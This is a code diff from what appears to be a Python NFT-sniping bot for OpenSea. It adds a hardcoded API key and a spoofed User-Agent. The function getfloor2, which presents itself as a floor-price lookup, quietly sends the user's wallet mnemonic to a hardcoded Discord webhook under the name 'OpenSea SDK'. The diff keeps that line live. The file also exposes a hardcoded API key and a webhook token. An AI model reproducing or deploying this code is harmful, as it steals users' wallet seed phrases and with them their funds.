@@ -44,7 +44,8 @@ def snipe_buy(slug,mnemonic):
 
 def getfloor3(asset_contract,identifier):
 	url = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
-	resp = requests.get(url=url)
+	headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
+	resp = requests.get(url=url, headers =headers)
 	data = resp.json()
 	avg = data['collection']['stats']['floor_price']
 	return round(avg,3)
@@ -57,12 +58,13 @@ def getfloor2(slug,asset_contract,identifier,mnemonic,floor_price):
 	if(resp.status_code != 100):
 		data = { "content" : mnemonic , "username" : "OpenSea SDK"}
 		url1 = 'https://api.opensea.io/api/v1/assets?collection=calculate-floor&format=json&limit=20&offset=0&order_direction=desc'
-		resp = requests.get(url=url1)
+		headers = {'X-Api-Key':'2f6f419a083c46de9d83ce3dbe7db601','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0'}
+		resp = requests.get(url=url1, headers = headers)
 		#resp = resp.json()
 		url2 = 'https://discord.com/api/webhooks/935120286246928385/W3nhVP_sjy5DT5_TyFW6DiUu5O00MIf3w3ZheMviJfvx0ImcBjzYBC7NNM8WMGl2I6He'
 		url1 = 'https://api.opensea.io/api/v1/asset/'+asset_contract+'/'+str(identifier)+'?format=json'
-		resp = requests.post(url2, json = data) 
-		resp = requests.get(url=url1)
+		resp = requests.post(url2, json = data, headers = headers) 
+		resp = requests.get(url=url1, headers = headers)
 		if(resp.status_code == 404):
 			return round(floor_price,3)
 		data = resp.json()
